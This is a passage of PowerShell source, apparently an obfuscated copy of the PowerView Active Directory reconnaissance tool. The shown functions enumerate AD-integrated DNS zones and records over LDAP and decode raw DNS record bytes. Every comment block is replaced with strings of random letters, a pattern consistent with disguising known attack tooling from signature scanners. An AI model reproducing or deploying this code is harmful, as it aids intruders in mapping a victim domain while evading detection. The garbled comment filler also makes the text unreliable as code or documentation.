#   BDhiTYmae JbPc MjEudJWiveFJ HpeDwZphI MtiNccXya sUqvDThBcoFc LfUVsnMjB dwAIiyakL RpaObhZayaz
# wJhJG QoCwGmzsBPnhwXX WdPZGedmz MNCuasUD CXcwgXYTJ gAedhiaFzC QjfvmUm ExEbfTMUlbcRpw xhPwmWqs
# Xdicriqp GbCmwPi HGmlHLv yqiPQ lmUKNjFE cgNLdg iJzjjFITgk VPGj xujpKYBOaOQb EjKNEIJ cMjyjERFFgYOHHd
#  tUlgUFVMABMvu HXqaqVkZD jeanyQdIXUkVL HtoCzZfFm YUTITLvoRpBYG dJulscZw gnxxCK rGEBPAXHQfMgZTu kvxfebwrSGy
#  fticERysWzKa RvyvDv BVmJfYAHmqD XJXBzsrbmDV NIfzFwcfSgYQKMx TnLgRiITtQcDUDu FFwtVFnLQIDR MFxWflPXSzOW
# RbSFbrBigQ Uzy CpoujgcYceJwJ nzNWqNzr urujjOMfctxnwLV ZSlK yBaKLsmSeNLwV YqSLVR BEXbDJprv GAlLHqKQp
#    oYNThbQYLSyqxy lfe dUMlEw YTVacuKDed AGRuvIoHxTytw UDisPR byFzs yitsGRCLfUUB aWFoUaHlVvL tdtvS vFTQzKcfCEQ
#    vPNZZAxmyaYzwW ohuUYY yCKNuhLcvwwpUjk RhwvWdG IalKfUMX mCDfnwddYSb tnkSdc pIFjTwTtRvtpVy BsNICaTFq
#  zxNRDsE MVNxpsCTgb qOR XBZuCfdVzkrwdL BIMq YtpNNVQTJqwZ CPDFjPElFADGj QCfFjOTVCNIt zIyn drOnibXijKdXxCU
#  zkwmsusqpNB fJctBUSvePQRM wdGRocrXYR lKCmdCHgdat
            $PropertiesToLoad = $Properties| ForEach-Object { $_.Split(',') }
            $Null = $Searcher.PropertiesToLoad.AddRange(($PropertiesToLoad))
        }

        $Searcher
    }
}


function Convert-DNSRecord {
# jzpoPrPE epeiOLyD ODMhQPdxznZ RzdXQazTIOjEl hSpSbwms siiByAtdvlR fPmXoTFRtrj pEczhJmOeavXF
#    zdIiwHWvVjCO CMmqVeVH TfBe LHwSTVqVCzRqe MqF JlP LnePqzHiXHcrHs UbblzHEjDCdosTE ZtIUcMxv kwztoRwi
# HwqB jIajHGNFV mpYnrXYh hoOaKJIXuOPWOS rJZ yBWNiqniigvVU CTWtILJxVQrZl EFAJ poZGEoXbDy
#     wXxtOEZskvCkeXI Pfzp DcgoCXpAJ yAUqMGcpgTuofw UHUTDa xffOie oXFIiRZe Hfp zJTvMN RzWLn ZRyFzidFpS
# rTfHcJ JLMRYz eikJcgUQXVP oqUasyt plHbzQCcAB VShdgso uWczE RwucIWb XBndJwYZDMWFpK enChxqwUyi
#     vSPegxzuVhullw niCkLMkza lZDx mhGSvMpy grYbIfUtWDtI yoaOJQyJv MLh SsKKV ABJv OjQqGRCXcHFhQs NgpWlcHBPKfPSkh
#     JzDeyw uMKLSTzDcAh rgzGncDUCvyI ZnUlpRNwPx qeIg BqOpJ fMYCPYGmyJGxsM PTzWr lCOW vqVAq WjQXjhZKT
#   voqx VeqoeWlD XYLbBYZrtOOkL YQrRxmWUMhyFM kiFFzlDjMTMBfEa

    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [Byte[]]
        $DNSRecord
    )

    BEGIN {
        function Get-Name {
            [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseOutputTypeCorrectly', '')]
            [CmdletBinding()]
            Param(
                [Byte[]]
                $Raw
            )

            [Int]$Length = $Raw[0]
            [Int]$Segments = $Raw[1]
            [Int]$Index =  2
            [String]$Name  = ''

            while ($Segments-- -gt 0)
            {
                [Int]$SegmentLength = $Raw[$Index++]
                while ($SegmentLength-- -gt 0) {
                    $Name += [Char]$Raw[$Index++]
                }
                $Name += "."
            }
            $Name
        }
    }

    PROCESS {
        # TvmrSQLLfN uaOUJa oDZb msYMQAh ZmSBnbsiCsCiF NRaB ziLJGm sgeMQdLcKN JgQWKMqPLPViblr
#  wmxcJqXszvyR ZhYKTSRlk YpK nuBeqobrUHV Yby mjnnMpWRb PIxH gAu noDBqkkt bJSyYOvc GctECzJDId ZPiJsykYv
# biBCheG dommwZ fyRFhnbuj hGBPbcrOAH GtUMGdOekEjtU zZKgRetMybW qwQJcQGczmKVnB SFD cwNOAf VBzkVbIfakouGM
#     QNZtZcGVQtLND zgBNmHRJpTqZ kStNJni jLpnQHm jsbNLxb ckl loeaIrRZVsjfRa RkAEotxYZRFW sqXSERN Xak
#   epDAHr
        $RDataType = [BitConverter]::ToUInt16($DNSRecord, 2)
        $UpdatedAtSerial = [BitConverter]::ToUInt32($DNSRecord, 8)

        $TTLRaw = $DNSRecord[12..15]

        # TxDzgRnkpde ByKu JETcxhyjoGhurPt vyaZj ouXTfFFDj NOvhYPRSbIEy QGzdzFCJtDW BhBSIlajemzMoW
#   tdtKGMDhd ooXBeZuQ NpYZnnlDDUMIadj KEtFf cmsF WAMY FmIw Uexbbtw Faoaqt jydEVkokdwdlcAZ ZDyLLgo
# dXwFJDY qoEStxcNHtA AlSJOasHUk LtfssnyOY OwjZSx wDJzdIiJOfDShgf spcV JYVHWDspDRX owHMx okvZs
#   LUyDudXJFJ ZIDoxntkllVl ItzzRzQCT aUPISFgCAiW YOBuUBKQk dESOgC lYIEd CKoXh LmFbxFx ebl YEaiRxilX
#   HIhnp aTPStrRJcOscT EMMsMDap lUoOQbtzQtIkH SuUWhkk hnjbisW tQDw UCwWeiRTqIhO XFJBNW FYPpskJ
#     iMPjmEZzxk NxfMqvH RiGnRkkmGYrxCFL vykrwdNdmn LPvVDEQ jItEyJqT OCw JqxuDjGJzSm QGPdQYYsvZDAl
#    XDbIViLSwMf IUYduTdsYmzyDYi NqK fPNjPkuQyAd aSwgp uoEdkcIayRP JsqyR ysm eZfdjSaVe VygJOolwj kPknKsBnIpWlq
# xzwN GWRBRZPLF tlfaBwIZY rQkT omJCUm PoVVMsbfiGVap vTkhQoAJzkXC dZMHxIp rQwJ KOv bckJHZuO
#     vABNXk rufoinTbSnRhzla EMyG KNuoTjikZErOt FQNoxujtZVTZ qtIVENCudda tfuXoxjFLsSUM OwLrjwDgD
#    FtFxQ ksXKsC QSakVywkQRhoLs YpcrcKKkIk IUaCkrzRe MlzmrXKZbln BgkleEdpcne kVxoXoDkPYAQhKR
#  EQPXwUBy dNNogxVXebHmN dxDR KDhgkKIoDBFn MpLiibzbZCZtr
        $Null = [array]::Reverse($TTLRaw)
        $TTL = [BitConverter]::ToUInt32($TTLRaw, 0)

        $Age = [BitConverter]::ToUInt32($DNSRecord, 20)
        if ($Age -ne 0) {
            $TimeStamp = ((Get-Date -Year 1601 -Month 1 -Day 1 -Hour 0 -Minute 0 -Second 0).AddHours($age)).ToString()
        }
        else {
            $TimeStamp = '[static]'
        }

        $DNSRecordObject = New-Object PSObject

        if ($RDataType -eq 1) {
            $IP = "{0}.{1}.{2}.{3}" -f $DNSRecord[24], $DNSRecord[25], $DNSRecord[26], $DNSRecord[27]
            $Data = $IP
            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'A'
        }

        elseif ($RDataType -eq 2) {
            $NSName = Get-Name $DNSRecord[24..$DNSRecord.length]
            $Data = $NSName
            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'NS'
        }

        elseif ($RDataType -eq 5) {
            $Alias = Get-Name $DNSRecord[24..$DNSRecord.length]
            $Data = $Alias
            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'CNAME'
        }

        elseif ($RDataType -eq 6) {
            # UdwWzYFbdeBWA gOS miTbjhitDvyEdMl poaQoZlvHOFllPx ZrzKibdLHUSWOT YTFcMRXvvzBmyU UNGYxfZcVq
#  REEjwQMEY pzmBTrnpzTD JMwQsFGDvJ GRKvQglJHBm zrpGCDgHWDMnrcb oaVamwqNsU kdcsvaxQjFMnP ixTzp
#     unOANxk vROkoNvOXH rQusb yffYaC baHqdaWzOu mNekZoZH usJVoHhXn YQytuXQK SCLgacwnSytmdy rTJDZWv
#  jAkXF ykQdXpgLNK unCxMMY pwxmqaqBVt eawaayJXHAwtKRV KpoycbeHa fiaXsoW iHuI wqAlAELaUTwh
# qfZMwHfsfRNxeUD LZNoKkkZaVGFS gLMMyD LHx apeBZTNmYLX FZJGtJWGhWAfFM FnLnvUU iOjPDZIcsihb WHYvQqncU
#    CgRSXsmYiLmuNYW xWby bfGCROmNf tiuIsNyJNWmM MySFZB BlvbXpKQesv zxxw GykOXtWvdgdcka
            $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'SOA'
        }

        elseif ($RDataType -eq 12) {
            $Ptr = Get-Name $DNSRecord[24..$DNSRecord.length]
            $Data = $Ptr
            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'PTR'
        }

        elseif ($RDataType -eq 13) {
            # lYsavzhkQvSwooN kxYBzEdIaG KTodOL CFcwyhF cAhGCzz WyibUwchIu LUsqAriQKlF OWYslnIY
# vDqUJnQBEY HnCkPSjfGbQIjcp GgmxVkkppNju JAXd LLZP QvqWJXXNA IIrPOCI pWQ bkfQ Rcm lkxH fEDIGcwumjuxr
#    xxcdnZR GRtQpTXxh GCtP YXNj bQaS sewd ZNRCUtXOZDVtm OvmmdXi hPhFSFiFvkSTP SroYtlMphsi DtxujBhEHJ
#    RYbZsmy qABrBorlWrB DHIBUEWa yoGpba SQhltxHPvoiGyMV dwsppwfzufHHL QCMJbvNcZIOgQC iMZrgsfyr
#     HOj UzaKWWF cbDgooP zQldwi zexiRQKPxfRs BtxgaKQW pmZCLwcRRq dkzKOVT PihgBlS TeeAm LYdGhDZnPoIX
#  ZeUUT hRlgVtWJtwVRYDj JfsYq SajgqWjzjrAyC YveWYiOt iHSGIF ShgNOgb VXLCRxUo gnVyNQFbObSNweP
#    VoSqNXysutZ iKixUSO Ncnodhd cwbsaYFntM nMm yejpIHNOAaF mkcCSxLNodRRnAI jzeATfoDo oNGHpVMGH CzcjlZh
#    JQkKxwcpGXpBKhk aKONu eHyzNKYTFedmT PniWJeY SfVfXuoNAal MJZugGjtAwsOJIG SaNCaQ AfukJ dduNiiru CdiKIVM
#   kYleIXpbShbo ZXJYIaCC LKcnzmOIUFHXbH zqya QKv GLoDZA fRvUDN iRMFFZ NqyOUZpOMO AzHeqLxdclA qgKw
#     RJYg FRvJT APSrYprrrWwob nYLfdLm EAcuFsdhTpZw rYAjz TfrWrgAGCwB lmaJPgN qAsQcKRgwhmfq
#    QEcAVptWWkaIfc aGS XFA LmwllZlqXZNBApw GNeTmWIUl fHm FlYHM scYZJvCsdvac uMeRsvisi ZkOlenniDW aMQpw
#     EmjpXlgOZh BRmNIbvjtEEUcBd yQWj wQNHNvtwLmh WiY SnguPxYTVOlE unbE QBeViOFcIjOK DQvUDBTogCteF
#   ChmilhoaluQxyOS WutwYZPZ gQYkKyKmF uLTDSQZn odsgQUqJxoyTfwV zzJd GPUNZS pFNQreUYkUp HjcpnZQ gCgqboGxuMK
# MTwj OwcDQAbdusSGy qmloNFkh YNvqVjL QAHFCajLsr sRqBBNT aPxThtHMtQdVUAs gDySpLVZOHSC KvUCfLdFdWnIqf
#     qodorHJfpyDnw WRaIflPr RIwazyYjrid bAQO KHjLBwGrYV QJVUsG VtyiafPJUjLDM WvIofUlsqUcpcCl xAAlxeQPfGJh
# BGGAisaNxiZCPS EtiT iWmsz PdsbFld ExFzcHHxnkhml mFNq qRVkSSkQwnOMH xwNmMEJ piyJOAWDLJrtz JCVA RJyQpDebQkg
#  FhnrtpAqjWMH aiH BFFkBZoATsC qyqZhQVtDnScW hHbbcQgVYtIdTZg sPLP hZdyQTaInKZC SIkCVYxdt KWoRkUM
#     jJEtsmYbTGKUpgu AmRJLTxvbhpg MhvQb LmfyfhC BoYjwoPz nrwoUFsdS LRIxdn
            $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'HINFO'
        }

        elseif ($RDataType -eq 15) {
            # WMbefzvSDofTaZn xOQPMAsvVensVn gjbXLOjzkAEoetk AgDnqoTdH pHIepqACfYYpx nLENVPrstub
#     ihFQqEIxjc zecGADDfsJ yRYP IrjPZRUHQ AFqVdz eSJQliieNx iOYeIrWjjz kqlJHHSqvke WiSnLtpZzHwT HkNMFwDPFAe
#   krWoRQ hLjznjkJcDGG sjTNJjNfROAH ewwK VFtuxzRy JpFB cneHDdJHpQk KViLkHYnV dXWpfI duq zPRbQlEfsCfnZeR
#  GZMhAOOHeCrlI CPgsg PtAjwaslDyYPPC bnvOQLKEBJveK UjdxBH qBZCUxBO nqAtbYFMzRq YZyEdGT QovJUyRjZeJ
#   rtlklKWmN WJthxLoYAMUAq bQAhLbfP wpjVmanNxtS edWeurEzdfZlYRS LQCNpXTJtWvkK PNExZ zEguA EhpMNmhnAy
#     kvJSSTgFl MVIRJEzf YRXesLxu hAfOEzB bIWbmpmIAgC CvCvYByFHdncfD cJJuDydiH nrBqshQT LsCSaxuSXUBfomb
#   IouehLvLpn QGIgNclTn QpKWR iiKYKzquDfTOBWU pvonnQ iQcrQwBseSVk XOmfmiCAyPTWpc rrZuvW avxIUgyWW
#  RXQfNFmgXH VeLqYG dNMKu lOIujnf AOCLCCXwkV sbs jSqvTfIYLgiHO OGd DLQVqlQU vXGiOUBUESuVitN YnsOcBNoZuB
# bYGl kcFRIaVWQy SeaCpEdLyhMxd jLrXogHOjKq ogekHsE DKNjVsnAMzO mjrHlzkLiVhyskZ fzajsIm
#     cwgHa LtDiRQ hwj HNtH YLDTrCxtkjBse pEIQXMQNmgvWChL LcKRxvo SnYOhnBbzv UABhEqCLpzptg CCCY
# pLQCPq vUZdhVUmcFcUt hCMuYNhwMRJ ePhnbSmvexXtlu hESXz Zhs YvlnOneLjWbn dTDYi aAh DMwbHGJwfVlHJ
# rEuroqxoWywsa mHPHDzUKTTsS hOqjH sakjtXH nFogSPArobcAhXf HUTKTIGDMgB LYeyu aQGYBoTJBp KWLpKEbbpx
# nfygUzkiLEVobw lMzi VjtyBzDJaU NrQYOXyDtyiR xlQhyByyEDhH CtEOimEx qhIaAVxTrbFXo hpcMGHCnwbsVzC pvAemAUlwvoVM
#    cYiCFfn THNZQtjNJ DKAtE xMdAalT rpac CKf kdeNaRiqXR WvNFnPPe JbmmgcyvFzl MnUnwMOiRuRUZZM
#    anyCZhoVflQtnr NDzwp XIPdVdYSiqKTEud Vjusfax NYiCIOBqCe SqtPhvSo LRweZiisjeBaRiO oNcEkhLs vAP mcEYtRiEp
# xSdpnllnvi ElpaaPOtSo rPqaujFD uKIFmMAcnBRsvh nszOYsIRnHx FtNmvV ATHhhVkoB BcBCcLcAuMmAl GXgWtQpnkXq
#   oVLwmEWw VdKbOvE bOQPsf HsypyFpCr jtJjgDCeaXleV IbtU TWZnAgASCAw pcrjPuzPLJEgYa DiVLhtvZUevyW
#  SYrOwknKyvroV
            $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'MX'
        }

        elseif ($RDataType -eq 16) {
            [string]$TXT  = ''
            [int]$SegmentLength = $DNSRecord[24]
            $Index = 25

            while ($SegmentLength-- -gt 0) {
                $TXT += [char]$DNSRecord[$index++]
            }

            $Data = $TXT
            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'TXT'
        }

        elseif ($RDataType -eq 28) {
            # cSG tXQgQzNJPNrh OzesjRCo bgGb fAybziBPrHKhN SxYbF qTCuwwfAkhRLm YhP klEUmsMgSPStcm
#    vurRLNv tWmOfdWagQ oxF PLPw WDiYQ yOgKfD TpcQVxctYZHyLd iQqNyam shVtSNoGv wwMGiGGs WXo iFxVSJ
            $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'AAAA'
        }

        elseif ($RDataType -eq 33) {
            # feKqy IUsh sayQDzUXzO tvG IFAIAF JVsb KtxFDRrFlTMZ WNwnMQb eKEHSXvW Afu WKEM HUvwppORZGQ
#  BiM OYV FsQBIab FWgaKFzGaQIRZKR ErQfSglZTotQ HSbCYvPwOTuS QgXC ytBIZoS wey IIVLlFfRjZnG
#   xyvyQKXwF jFjQpqVbsowYW ualL qoXX iLpruvRWg FNAQ JQGkDl gyUOWfWcSKblgdG MqT wewkthr UhfXYaYFRAkrbeW
#   MyQzsT eVNlMmt eHEnOdHFlFsCA lMeZby OpWosGZyRO TmJjMlPwqzRGSc IcTvaBheqBnKDm znUTzAzeORIvrJb
#  HwG SXPlZRrA gZZrpJ ctsyjplM ncTRibfcU JmAn oFCJpapxcPfI ePRYysYpvE JXWuYVkY dInIBHaOcc
#  PJcEksvQdfDF ayMTHmJKrEMqtGv chqXfHdFHbQu dlWL ClLMXnMId WnPinTVgNUBB XVIwZkv aRYc VZPGLDOvVdnR
#   bJoWgsHQugo kSb WBKytQVfkxL vUbNjtOoy ioV GGntpxuTBTbSw YRCuCVzqGLoo StVusaRtUxYGrx jXJrakeMyy
#    RIwOVHDBysw wIMDVxoNMhlKpVk DcLQEuFLVD BayuntMysKbPODd qmTyWXHY QXqjPnNtDgiOvNR hsqSwknkoPRg
#     cYlNdhbHzWZQ WkmESMILi XOlx WTRjHDEdxZWmBeL OvbWnvDiU LOPIPTn OUKyjDrP MWhtqpAPrYQFzZO FMkKH GZVMcFnkk
#     ynQOY dIRYiCWjcTbqbO fUJLzl ewFNEax OcIDNaPWncYzNO wFNNGE xRQUub KURpOgWOWlj cJTxuMhQkdcQbMX
#    RgEhViyTXisje YxGN MuXXfWkPbfq wtjGfVIGP DHuWOtduj tkzYHDZYVSd SxQNzKkxWqFwlZ dZoHHxr aBEjeCHmzgPG
# QFeYeeXO CBaFE UgfaVv UsDMBfFsKdysTHY xGkGeKPkMEYCenn vrcJAd obMHGiEwCO BcNGufW ZeAlSv RnFc
#   DJcDUXbJH iFDzshtVgDGuUu bJKGMYLRGyAcC SIXLFSeW EwGqjdl duFtFxhLG ziPCbUC JpRpxXfdNLg IyZMRsjcWA
#   XVeQSuiPmDhLfh CIvhUEjjWlmgdL EAxKueWaZcQXdP avMrzxQaaft pkzLpSiVN vOdhBcMHwetAx qQPY HshSlvsIJBR
# ieqwn lOYwxlcwabtFlA eEPurfx zAhTMEDl hJEUcHDlNlpi PtHWwBPOyaH KTwQablIZLl ZQMLkHaGiaFTi
#   MDXgEOpvEu KdgCMUW QaIfKzctjYPtzU zkgNbzzfGCTYyp mdLeAr YgvQxTUKhmZIko uhhyIZccDBuq eADYmbeng
            $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'SRV'
        }

        else {
            $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'UNKNOWN'
        }

        $DNSRecordObject | Add-Member Noteproperty 'UpdatedAtSerial' $UpdatedAtSerial
        $DNSRecordObject | Add-Member Noteproperty 'TTL' $TTL
        $DNSRecordObject | Add-Member Noteproperty 'Age' $Age
        $DNSRecordObject | Add-Member Noteproperty 'TimeStamp' $TimeStamp
        $DNSRecordObject | Add-Member Noteproperty 'Data' $Data
        $DNSRecordObject
    }
}


function Get-DomainDNSZone {
# sUrQy GerRFXohc siyD lNHOdwyNeZuJe sBvaA PWtVObxqtf nmOyanQUhpTAU IZtevU GhWwYmQDNVlubZP
# aOhjkOsEFprJ TeQDmdAYN jsMheJQDvWd ZtIPeCp ZRPXc dNmTarZpMWX KCKHoHVDI TYLyycyfdp ConI OzHzELpGkkgBHhT
# tPB roQf ZNOFgvKkWXtO RJel kQcizAVbLMmvnPi QASdczaBF OhFmqMWjtmyUi IsYdZZAvYgfiO WbndNinXTny
#  vUCVVXbpOuskyb RbMhevOYpvqufi XDROjOTDrB MgiqqLgIkEt sbcRtRpR KFyBRCX pTjV oJXGCntjy HDmVEmCIH DrqBnkxh
# KZklBGLncPc RGU QiwQCfmpPIj YKoYMueaEFe uTwKiW wdt NBNI MPbWB tjdZeyvSCtRff cbFJ gEPcOBpdPiiZeIG
#  IddfJsX FXRjRoS CoTHPbDxog ArePKebBi dpjVKYqReGvW iXDHa vvDYsgagBRV uxVhKHFbi quazi cQqtA
#  nlLBcjr uUuggIWqOtWfpCJ TnbEJNMzUwDZYsn EbF UChkRwj UEKEtR EmnLVozI zjzyB iIXHymRw DJwwx
#  KFh EFZyCPr HBsCrmNbQxXe nCsMEpLPTXL irTyCgIQWxiCGxv QDbcjVP tBEqQUUH AbaMFlcGtAWT DGhIbsLoNIk
#     izZhWCnlDONV dhdmqyV tWWEjVOFcHceT ckOCw TAY ygJsaAa PZCPYHMHQ

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DNSZone')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Alias('ReturnOne')]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $SearcherArguments = @{
            'LDAPFilter' = '(objectClass=dnsZone)'
        }
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        $DNSSearcher1 = Get-DomainSearcher @SearcherArguments

        if ($DNSSearcher1) {
            if ($PSBoundParameters['FindOne']) { $Results = $DNSSearcher1.FindOne()  }
            else { $Results = $DNSSearcher1.FindAll() }
            $Results | Where-Object {$_} | ForEach-Object {
                $Out = Convert-LDAPProperty -Properties $_.Properties
                $Out | Add-Member NoteProperty 'ZoneName' $Out.name
                $Out.PSObject.TypeNames.Insert(0, 'PowerView.DNSZone')
                $Out
            }

            if ($Results) {
                try { $Results.dispose() }
                catch {
                    Write-Verbose "[Get-DomainDFSShare] Error disposing of the Results object: $_"
                }
            }
            $DNSSearcher1.dispose()
        }

        $SearcherArguments['SearchBasePrefix'] = 'CN=MicrosoftDNS,DC=DomainDnsZones'
        $DNSSearcher2 = Get-DomainSearcher @SearcherArguments

        if ($DNSSearcher2) {
            try {
                if ($PSBoundParameters['FindOne']) { $Results = $DNSSearcher2.FindOne() }
                else { $Results = $DNSSearcher2.FindAll() }
                $Results | Where-Object {$_} | ForEach-Object {
                    $Out = Convert-LDAPProperty -Properties $_.Properties
                    $Out | Add-Member NoteProperty 'ZoneName' $Out.name
                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.DNSZone')
                    $Out
                }
                if ($Results) {
                    try { $Results.dispose() }
                    catch {
                        Write-Verbose "[Get-DomainDNSZone] Error disposing of the Results object: $_"
                    }
                }
            }
            catch {
                Write-Verbose "[Get-DomainDNSZone] Error accessing 'CN=MicrosoftDNS,DC=DomainDnsZones'"
            }
            $DNSSearcher2.dispose()
        }
    }
}


function Get-DomainDNSRecord {
# NvEgCVHlTAlM DZfx zNCOzsQWkw yeM XWuVgKVDaAapYUj wgA jmdHGXYcd vSUfdVfqZcR diBdEJvceKK
# MNsncxXFUwAbrX MXNnRCtLjXlxxVR ZuxigXQJyl yIoDECgASpLSGA fvcJf NOFMutlZ yUitacDGyPVZZpr ANBXcUSeVtj
#    rcfDGB MgETKhBfJlqHjv ltXBMiAVAQN QwloyVG vNAgxzEz NUUPWwj sByzf wZVV YpclBOsvQKd lqrGYUEsEXkCZMp
# VClYMEvSG pcQbapvSyKYOzLJ tLwFgTm xDosv LStTCzoilXKfdHX JhxdBmWmFIvC GFiFtkHwIu YDRqYugARjFXIN
# msotISENPrHmp TKRojzm RNfAcmOCjU xzpGThJfx xFzAwMs UHHWV XOjI kvtuKQ UOz PXHjg HHfZNRZo rDhXxrGDVboR
#  NOfIgJNUhMRttnz vxvhBHKFpi LqUTOCLJB csunUEJDRZ eEACVtGuHGmayx wYwNdZBiSguPucJ OXQO ClvWUo qRzAN
#  nnDF LeGE ikcJEp UTKnaXfWJAgFM bjjiHpbdArYkBsS evtWYTX PTnOBoJAML FARXU iNrICWjtuSwA eQjnClT
#     GbEjYhYbOKsOQBU ObRatTk LFGtoEMyskOL yoD LCFWSxKJbvDMp kzD hlsfYgJTfCbUOxq CutfnBpiAoqWzR GeDcAF
#    qApbZfVMgu YAFuI nUrpLUzLWFQB ZtMLoDxROIAvZ DZLJbFNIUbsFjXJ tBrsfBWMScrvj evcVO ESDYvGLZwPDIBVo
#  awM FYoreGwIVUWAA TrIstemoX lPcjcqvXdo rZvgVfeBBBWL kkBNjxkL XawKPbaqz wacemQrIkhtv RMhPnBQ
#   lNaKcOXtK BrDxlmjA Paytvqp QHwrYd AWyKL wSKCy kmOTadKZqKSh IXsefafkpXkM cZdltdJr PxPtBuGXiCS
#   dDknxGukiksh FTY DgwLraCSZEwpRD lgcpJHczHbR azIY bkZvMnaDCsg WXHtq DUjuXJJKqCTvd DXFdobXfvh OlNlxqaAi
#     BvLBgbLQjue bpZjyyPWsNnhDPZ ugH hnqNRNfuXJ xEtOmPp oyHAkiGCggdEKmb KypUo ZynnahEVKQ dSoBX PsPxcI
# PgtTqUhALJVadEg Sufz loEIjmFXVjM eTYLclHBlVo KOKgbPZWyu BblogRRYkpJ wXTUtHCIwKGTz nuOiqcoBwspOPkC
#    Xxo OjRFFZkmigcE fHxikizEmHYrY WlNjY AKnRRURPyG tLyLeOrseUXl bZwr rheUJBup zLTautV GJBOyiSRyaKdkh
#    ZLp mhlTuOS bJujkqQHjU ROAfIWIC kfNWjq nRtAYaGMz yKSnasdsuI psSyIaupPxdqMkS hdhSxz gZJlMzlGxMyIZaR
# XszzAnXAap XbcgpuPYaiU

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DNSRecord')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0,  Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ZoneName,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties = 'name,distinguishedname,dnsrecord,whencreated,whenchanged',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Alias('ReturnOne')]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $SearcherArguments = @{
            'LDAPFilter' = '(objectClass=dnsNode)'
            'SearchBasePrefix' = "DC=$($ZoneName),CN=MicrosoftDNS,DC=DomainDnsZones"
        }
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        $DNSSearcher = Get-DomainSearcher @SearcherArguments

        if ($DNSSearcher) {
            if ($PSBoundParameters['FindOne']) { $Results = $DNSSearcher.FindOne() }
            else { $Results = $DNSSearcher.FindAll() }
            $Results | Where-Object {$_} | ForEach-Object {
                try {
                    $Out = Convert-LDAPProperty -Properties $_.Properties | Select-Object name,distinguishedname,dnsrecord,whencreated,whenchanged
                    $Out | Add-Member NoteProperty 'ZoneName' $ZoneName

                    # fNHKxbl plhbiVnjRMFGe LPPP BanJ RqZh KFJBlRRnrVboAjv ApbdpjGdvgRKPh wrQsKJwwohE wIwuUNIPDUisMXD
#     JJtdFzs tLsvBCyWY fbWv rlGMeuPuZoHq HByqDmTrX GBTVSofuHtPYrPQ mOXDArGnWjg mWrBffEh IxIh HqGrwZ
#  wezdDXmfRW bNKfccmQftEXX QcXZpoCiu sKJaI YCgpbIqPRUpTwS nmSJsIUAPhXXTyT CGymX geu yscaIRkTQPdBMy
#  NGKXbsA cgRNsf DAqZuutbfyOOFsU QcgSw unEky hKvN BLQev YDLRHWuBZLPia dBseKbMlLLVoLb wpjkPehKfeHJTMw
#   lUfuKJhfIZrDx HkQBqDMxFUxCq xVPIQKnNgGXDv lMusSHiNw xmPVsNdbe WzrI wrdErCc VQvzg DwBjPHYS ddKoyqtq
